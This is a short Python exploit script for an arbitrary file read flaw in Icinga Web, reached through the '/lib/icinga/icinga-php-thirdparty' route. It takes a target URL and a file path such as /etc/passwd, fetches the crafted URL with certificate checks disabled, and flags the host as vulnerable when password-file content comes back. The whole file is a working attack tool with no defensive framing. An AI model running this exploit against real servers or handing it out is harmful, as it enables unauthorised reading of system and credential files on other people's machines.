from optparse import OptionParser
import requests
requests.packages.urllib3.disable_warnings()
import httpx

def checker_vuln():
    parser = OptionParser()
    parser.add_option("-u", "--url", dest="url",help="Url to scan", metavar="URL")
    parser.add_option("-p", "--path", dest="path",help="File to read ex:- /etc/passwd", metavar="FILE")
    (options, args) = parser.parse_args()
    url=options.url
    path=options.path

    try:
        exploit_url=url+"/lib/icinga/icinga-php-thirdparty"+path
        request = httpx.get(exploit_url,verify=False,timeout=3)
        file_content = request.text
        if "root:x:" in file_content: 
            print("[+] " + url +" Is Vulnerable see "+exploit_url)
        else:
            print(url)

    except Exception:
        print("")
    
checker_vuln()
